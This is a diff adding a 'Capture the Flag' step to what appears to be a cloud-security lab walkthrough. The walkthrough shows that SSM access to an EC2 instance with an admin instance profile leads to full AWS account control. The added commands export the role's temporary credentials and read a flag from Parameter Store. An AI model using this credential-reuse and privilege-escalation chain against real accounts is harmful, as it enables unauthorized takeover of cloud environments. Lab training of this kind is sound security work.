@@ -87,6 +87,24 @@ aws iam list-users
 # Returns: full list of IAM users — you now have AdministratorAccess
 ```
 
+## Capture the Flag
+
+With the temporary credentials for `pl-cspm-ec2-001-admin-role` in hand, exit the SSM session and retrieve the scenario flag from SSM Parameter Store. `AdministratorAccess` grants unrestricted access to all AWS services, including `ssm:GetParameter` on every parameter in the account:
+
+```bash
+export AWS_ACCESS_KEY_ID=<AccessKeyId>
+export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
+export AWS_SESSION_TOKEN=<Token>
+
+aws ssm get-parameter \
+  --region <REGION> \
+  --name /pathfinding-labs/flags/cspm-ec2-001-to-admin \
+  --query 'Parameter.Value' \
+  --output text
+```
+
+A successful response returns the flag value, confirming full administrative access to the account.
+
 ## What Happened
 
 You started with a user that had only the right to open an SSM session on one EC2 instance. That turned out to be sufficient to gain full administrative control of the AWS account, because the instance had `AdministratorAccess` attached to it via an instance profile.
